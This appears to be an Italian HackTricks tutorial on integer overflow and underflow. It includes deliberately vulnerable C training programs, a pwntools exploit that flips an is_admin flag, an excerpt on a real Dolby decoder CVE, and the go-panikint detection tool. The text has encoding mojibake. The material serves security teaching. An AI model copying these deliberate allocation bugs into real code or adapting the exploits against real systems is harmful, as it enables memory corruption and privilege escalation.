# Integer Overflow

{{#include ../banners/hacktricks-training.md}}

## Informazioni di base

Al centro di un **integer overflow** c'Ã¨ la limitazione imposta dalla **dimensione** dei tipi di dato nella programmazione e dalla **interpretazione** dei dati.

Per esempio, un **8-bit unsigned integer** puÃ² rappresentare valori da **0 a 255**. Se si tenta di memorizzare il valore 256 in un 8-bit unsigned integer, questo ritorna a 0 a causa della limitazione della sua capacitÃ  di memorizzazione. Allo stesso modo, per un **16-bit unsigned integer**, che puÃ² contenere valori da **0 a 65,535**, aggiungere 1 a 65,535 riporterÃ  il valore a 0.

Inoltre, un **8-bit signed integer** puÃ² rappresentare valori da **-128 a 127**. Questo perchÃ© un bit Ã¨ usato per rappresentare il segno (positivo o negativo), lasciando 7 bit per rappresentare la magnitudine. Il numero piÃ¹ negativo Ã¨ rappresentato come **-128** (binary `10000000`), e il piÃ¹ positivo Ã¨ **127** (binary `01111111`).

Valori massimi per tipi di interi comuni:
| Tipo           | Dimensione (bits) | Valore minimo          | Valore massimo          |
|----------------|-------------------|------------------------|-------------------------|
| int8_t         | 8                 | -128                   | 127                     |
| uint8_t        | 8                 | 0                      | 255                     |
| int16_t        | 16                | -32,768                | 32,767                  |
| uint16_t       | 16                | 0                      | 65,535                  |
| int32_t        | 32                | -2,147,483,648         | 2,147,483,647           |
| uint32_t       | 32                | 0                      | 4,294,967,295           |
| int64_t        | 64                | -9,223,372,036,854,775,808 | 9,223,372,036,854,775,807 |
| uint64_t       | 64                | 0                      | 18,446,744,073,709,551,615 |

Un short equivale a `int16_t` e un int equivale a `int32_t` e un long equivale a `int64_t` nei sistemi a 64 bit.

### Valori massimi

Per le potenziali **vulnerabilitÃ  web** Ã¨ molto utile conoscere i valori massimi supportati:

{{#tabs}}
{{#tab name="Rust"}}
```rust
fn main() {

let mut quantity = 2147483647;

let (mul_result, _) = i32::overflowing_mul(32767, quantity);
let (add_result, _) = i32::overflowing_add(1, quantity);

println!("{}", mul_result);
println!("{}", add_result);
}
```
{{#endtab}}

{{#tab name="C"}}
```c
#include <stdio.h>
#include <limits.h>

int main() {
int a = INT_MAX;
int b = 0;
int c = 0;

b = a * 100;
c = a + 1;

printf("%d\n", INT_MAX);
printf("%d\n", b);
printf("%d\n", c);
return 0;
}
```
{{#endtab}}
{{#endtabs}}

## Esempi

### Pure overflow

Il risultato stampato sarÃ  0 poichÃ© abbiamo overflowed the char:
```c
#include <stdio.h>

int main() {
unsigned char max = 255; // 8-bit unsigned integer
unsigned char result = max + 1;
printf("Result: %d\n", result); // Expected to overflow
return 0;
}
```
### Signed to Unsigned Conversion

Considera una situazione in cui un intero signed viene letto dall'input dell'utente e poi utilizzato in un contesto che lo tratta come un intero unsigned, senza un'adeguata validazione:
```c
#include <stdio.h>

int main() {
int userInput; // Signed integer
printf("Enter a number: ");
scanf("%d", &userInput);

// Treating the signed input as unsigned without validation
unsigned int processedInput = (unsigned int)userInput;

// A condition that might not work as intended if userInput is negative
if (processedInput > 1000) {
printf("Processed Input is large: %u\n", processedInput);
} else {
printf("Processed Input is within range: %u\n", processedInput);
}

return 0;
}
```
In questo esempio, se un utente inserisce un numero negativo, sarÃ  interpretato come un grande unsigned integer a causa del modo in cui i valori binari vengono interpretati, potenzialmente portando a comportamenti imprevisti.

### macOS Overflow Example
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

/*
* Realistic integer-overflow â†’ undersized allocation â†’ heap overflow â†’ flag
* Works on macOS arm64 (no ret2win required; avoids PAC/CFI).
*/

__attribute__((noinline))
void win(void) {
puts("ðŸŽ‰ EXPLOITATION SUCCESSFUL ðŸŽ‰");
puts("FLAG{integer_overflow_to_heap_overflow_on_macos_arm64}");
exit(0);
}

struct session {
int is_admin;           // Target to flip from 0 â†’ 1
char note[64];
};

static size_t read_stdin(void *dst, size_t want) {
// Read in bounded chunks to avoid EINVAL on large nbyte (macOS PTY/TTY)
const size_t MAX_CHUNK = 1 << 20; // 1 MiB per read (any sane cap is fine)
size_t got = 0;

printf("Requested bytes: %zu\n", want);

while (got < want) {
size_t remain = want - got;
size_t chunk  = remain > MAX_CHUNK ? MAX_CHUNK : remain;

ssize_t n = read(STDIN_FILENO, (char*)dst + got, chunk);
if (n > 0) {
got += (size_t)n;
continue;
}
if (n == 0) {
// EOF â€“ stop; partial reads are fine for our exploit
break;
}
// n < 0: real error (likely EINVAL when chunk too big on some FDs)
perror("read");
break;
}
return got;
}


int main(void) {
setvbuf(stdout, NULL, _IONBF, 0);
puts("=== Bundle Importer (training) ===");

// 1) Read attacker-controlled parameters (use large values)
size_t count = 0, elem_size = 0;
printf("Entry count: ");
if (scanf("%zu", &count) != 1) return 1;
printf("Entry size: ");
if (scanf("%zu", &elem_size) != 1) return 1;

// 2) Compute total bytes with a 32-bit truncation bug (vulnerability)
//    NOTE: 'product32' is 32-bit â†’ wraps; then we add a tiny header.
uint32_t product32 = (uint32_t)(count * elem_size);//<-- Integer overflow because the product is converted to 32-bit.
/* So if you send "4294967296" (0x1_00000000 as count) and 1 as element --> 0x1_00000000 * 1 = 0 in 32bits
Then, product32 = 0
*/
uint32_t alloc32   = product32 + 32; // alloc32 = 0 + 32 = 32
printf("[dbg] 32-bit alloc = %u bytes (wrapped)\n", alloc32);

// 3) Allocate a single arena and lay out [buffer][slack][session]
//    This makes adjacency deterministic (no reliance on system malloc order).
const size_t SLACK = 512;
size_t arena_sz = (size_t)alloc32 + SLACK; // 32 + 512 = 544 (0x220)
unsigned char *arena = (unsigned char*)malloc(arena_sz);
if (!arena) { perror("malloc"); return 1; }
memset(arena, 0, arena_sz);

unsigned char *buf  = arena;  // In this buffer the attacker will copy data
struct session *sess = (struct session*)(arena + (size_t)alloc32 + 16); // The session is stored right after the buffer + alloc32 (32) + 16 = buffer + 48
sess->is_admin = 0;
strncpy(sess->note, "regular user", sizeof(sess->note)-1);

printf("[dbg] arena=%p buf=%p alloc32=%u sess=%p offset_to_sess=%zu\n",
(void*)arena, (void*)buf, alloc32, (void*)sess,
((size_t)alloc32 + 16)); // This just prints the address of the pointers to see that the distance between "buf" and "sess" is 48 (32 + 16).

// 4) Copy uses native size_t product (no truncation) â†’ It generates an overflow
size_t to_copy = count * elem_size;                   // <-- Large size_t
printf("[dbg] requested copy (size_t) = %zu\n", to_copy);

puts(">> Send bundle payload on stdin (EOF to finish)...");
size_t got = read_stdin(buf, to_copy); // <-- Heap overflow vulnerability that can bue abused to overwrite sess->is_admin to 1
printf("[dbg] actually read = %zu bytes\n", got);

// 5) Privileged action gated by a field next to the overflow target
if (sess->is_admin) {
puts("[dbg] admin privileges detected");
win();
} else {
puts("[dbg] normal user");
}
return 0;
}
```
Compilalo con:
```bash
clang -O0 -Wall -Wextra -std=c11 -D_FORTIFY_SOURCE=0 \
-o int_ovf_heap_priv int_ovf_heap_priv.c
```
#### Exploit
```python
# exploit.py
from pwn import *

# Keep logs readable; switch to "debug" if you want full I/O traces
context.log_level = "info"

EXE = "./int_ovf_heap_priv"

def main():
# IMPORTANT: use plain pipes, not PTY
io = process([EXE])  # stdin=PIPE, stdout=PIPE by default

# 1) Drive the prompts
io.sendlineafter(b"Entry count: ", b"4294967296")  # 2^32 -> (uint32_t)0
io.sendlineafter(b"Entry size: ",  b"1")           # alloc32 = 32, offset_to_sess = 48

# 2) Wait until itâ€™s actually reading the payload
io.recvuntil(b">> Send bundle payload on stdin (EOF to finish)...")

# 3) Overflow 48 bytes, then flip is_admin to 1 (little-endian)
payload = b"A" * 48 + p32(1)

# 4) Send payload, THEN send EOF via half-close on the pipe
io.send(payload)
io.shutdown("send")   # <-- this delivers EOF when using pipes, it's needed to stop the read loop from the binary

# 5) Read the rest (should print admin + FLAG)
print(io.recvall(timeout=5).decode(errors="ignore"))

if __name__ == "__main__":
main()
```
### Esempio di macOS Underflow
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

/*
* Integer underflow -> undersized allocation + oversized copy -> heap overwrite
* Works on macOS arm64. Data-oriented exploit: flip sess->is_admin.
*/

__attribute__((noinline))
void win(void) {
puts("ðŸŽ‰ EXPLOITATION SUCCESSFUL ðŸŽ‰");
puts("FLAG{integer_underflow_heap_overwrite_on_macos_arm64}");
exit(0);
}

struct session {
int  is_admin;      // flip 0 -> 1
char note[64];
};

static size_t read_stdin(void *dst, size_t want) {
// Read in bounded chunks so huge 'want' doesn't break on PTY/TTY.
const size_t MAX_CHUNK = 1 << 20; // 1 MiB
size_t got = 0;
printf("[dbg] Requested bytes: %zu\n", want);
while (got < want) {
size_t remain = want - got;
size_t chunk  = remain > MAX_CHUNK ? MAX_CHUNK : remain;
ssize_t n = read(STDIN_FILENO, (char*)dst + got, chunk);
if (n > 0) { got += (size_t)n; continue; }
if (n == 0) break;    // EOF: partial read is fine
perror("read"); break;
}
return got;
}

int main(void) {
setvbuf(stdout, NULL, _IONBF, 0);
puts("=== Packet Importer (UNDERFLOW training) ===");

size_t total_len = 0;
printf("Total packet length: ");
if (scanf("%zu", &total_len) != 1) return 1; // Suppose it's "8"

const size_t HEADER = 16;

// **BUG**: size_t underflow if total_len < HEADER
size_t payload_len = total_len - HEADER;   // <-- UNDERFLOW HERE if total_len < HEADER --> Huge number as it's unsigned
// If total_len = 8, payload_len = 8 - 16 = -8 = 0xfffffffffffffff8 = 18446744073709551608 (on 64bits - huge number)
printf("[dbg] total_len=%zu, HEADER=%zu, payload_len=%zu\n",
total_len, HEADER, payload_len);

// Build a deterministic arena: [buf of total_len][16 gap][session][slack]
const size_t SLACK = 256;
size_t arena_sz = total_len + 16 + sizeof(struct session) + SLACK; // 8 + 16 + 72 + 256 = 352 (0x160)
unsigned char *arena = (unsigned char*)malloc(arena_sz);
if (!arena) { perror("malloc"); return 1; }
memset(arena, 0, arena_sz);

unsigned char *buf  = arena;
struct session *sess = (struct session*)(arena + total_len + 16);
// The offset between buf and sess is total_len + 16 = 8 + 16 = 24 (0x18)
sess->is_admin = 0;
strncpy(sess->note, "regular user", sizeof(sess->note)-1);

printf("[dbg] arena=%p buf=%p total_len=%zu sess=%p offset_to_sess=%zu\n",
(void*)arena, (void*)buf, total_len, (void*)sess, total_len + 16);

puts(">> Send payload bytes (EOF to finish)...");
size_t got = read_stdin(buf, payload_len);
// The offset between buf and sess is 24 and the payload_len is huge so we can overwrite sess->is_admin to set it as 1
printf("[dbg] actually read = %zu bytes\n", got);

if (sess->is_admin) {
puts("[dbg] admin privileges detected");
win();
} else {
puts("[dbg] normal user");
}
return 0;
}
```
Compilalo con:
```bash
clang -O0 -Wall -Wextra -std=c11 -D_FORTIFY_SOURCE=0 \
-o int_underflow_heap int_underflow_heap.c
```
### Allocator alignment rounding wrap â†’ undersized chunk â†’ heap overflow (Dolby UDC case)

Alcuni custom allocators arrotondano le allocations all'alignment senza ricontrollare per overflow. Nel Dolby Unified Decoder (Pixel 9, CVE-2025-54957), il valore controllato dall'attaccante `emdf_payload_size` (decodificato con un loop `variable_bits(8)` non limitato) viene passato a `ddp_udc_int_evo_malloc`:
```c
size_t total_size = alloc_size + extra;
if (alloc_size + extra < alloc_size) return 0; // initial wrap guard
if (total_size % 8)
total_size += (8 - total_size) % total_size; // vulnerable rounding
if (total_size > heap->remaining) return 0;
```
Per valori a 64 bit prossimi a `0xFFFFFFFFFFFFFFF9`, `(8 - total_size) % total_size` provoca il wrap dell'addizione e produce un **piccolo `total_size`** anche se il `alloc_size` logico rimane enorme. Il chiamante poi scrive `payload_length` byte nel chunk restituito:
```c
buffer = ddp_udc_int_evo_malloc(evo_heap, payload_length, extra);
for (size_t i = 0; i < payload_length; i++) { // bounds use logical size
buffer[i] = next_byte_from_emdf();       // writes past tiny chunk
}
```
PerchÃ© lo sfruttamento Ã¨ affidabile in questo schema:
- **Overflow length control:** I byte provengono da un reader limitato da un'altra lunghezza scelta dall'attaccante (`emdf_container_length`), quindi la scrittura si ferma dopo N byte invece di spruzzare `payload_length`.
- **Overflow data control:** I byte scritti oltre il chunk sono interamente forniti dall'attaccante tramite il payload EMDF.
- **Heap determinism:** L'allocator Ã¨ un per-frame bump-pointer slab senza free, quindi l'adiacenza degli oggetti corrotti Ã¨ prevedibile.

## Other Examples

- [https://guyinatuxedo.github.io/35-integer_exploitation/int_overflow_post/index.html](https://guyinatuxedo.github.io/35-integer_exploitation/int_overflow_post/index.html)
- Viene usato solo 1B per memorizzare la dimensione della password, quindi Ã¨ possibile overflowarlo e fargli pensare che la lunghezza sia 4 mentre in realtÃ  Ã¨ 260 per bypassare il controllo della lunghezza
- [https://guyinatuxedo.github.io/35-integer_exploitation/puzzle/index.html](https://guyinatuxedo.github.io/35-integer_exploitation/puzzle/index.html)

- Dati un paio di numeri, trovare usando z3 un nuovo numero che moltiplicato per il primo dia il secondo:

```
(((argv[1] * 0x1064deadbeef4601) & 0xffffffffffffffff) == 0xD1038D2E07B42569)
```

- [https://8ksec.io/arm64-reversing-and-exploitation-part-8-exploiting-an-integer-overflow-vulnerability/](https://8ksec.io/arm64-reversing-and-exploitation-part-8-exploiting-an-integer-overflow-vulnerability/)
- Viene usato solo 1B per memorizzare la dimensione della password, quindi Ã¨ possibile overflowarlo e fargli pensare che la lunghezza sia 4 mentre in realtÃ  Ã¨ 260, bypassare il controllo della lunghezza e sovrascrivere nello stack la variabile locale successiva, aggirando entrambe le protezioni

## Go integer overflow detection with go-panikint

Go effettua il wrapping degli interi in modo silenzioso. [go-panikint](https://github.com/trailofbits/go-panikint) Ã¨ una toolchain Go forkata che inietta controlli SSA per gli overflow in modo che l'aritmetica che avvolge chiami immediatamente `runtime.panicoverflow()` (panic + stack trace).

**Why use it**

- Rende overflow/troncamenti rilevabili in fuzzing/CI perchÃ© il wrapping aritmetico ora provoca crash.
- Utile in contesti come pagination controllata dall'utente, offset, quote, calcoli di dimensione o matematica di access-control (e.g., `end := offset + limit` on `uint64` wrapping small).

**Compilazione e utilizzo**
```bash
git clone https://github.com/trailofbits/go-panikint
cd go-panikint/src && ./make.bash
export GOROOT=/path/to/go-panikint
./bin/go test -fuzz=FuzzOverflowHarness
```
Esegui questo binario `go` forkato per test/fuzzing per far emergere gli overflow come panics.

**Riduzione del rumore**

- I controlli di troncamento (cast a tipi interi piÃ¹ piccoli) possono essere rumorosi.
- Sopprimi i wrap-around intenzionali tramite filtri sul percorso sorgente o commenti inline `// overflow_false_positive` / `// truncation_false_positive`.

**Esempio reale**

go-panikint ha rivelato un overflow di pagination `uint64` nel Cosmos SDK: `end := pageRequest.Offset + pageRequest.Limit` ha effettuato un wrap oltre `MaxUint64`, restituendo risultati vuoti. L'instrumentazione ha trasformato il wrap silenzioso in un panic che i fuzzers hanno potuto minimizzare.

## ARM64

Questo **non cambia in ARM64** come puoi vedere in [**this blog post**](https://8ksec.io/arm64-reversing-and-exploitation-part-8-exploiting-an-integer-overflow-vulnerability/).

## Riferimenti

- [Detect Goâ€™s silent arithmetic bugs with go-panikint](https://blog.trailofbits.com/2025/12/31/detect-gos-silent-arithmetic-bugs-with-go-panikint/)
- [go-panikint (compiler fork)](https://github.com/trailofbits/go-panikint)
- [Pixel 0-click â€“ CVE-2025-54957 allocator wrap â†’ heap overflow](https://projectzero.google/2026/01/pixel-0-click-part-1.html)

{{#include ../banners/hacktricks-training.md}}
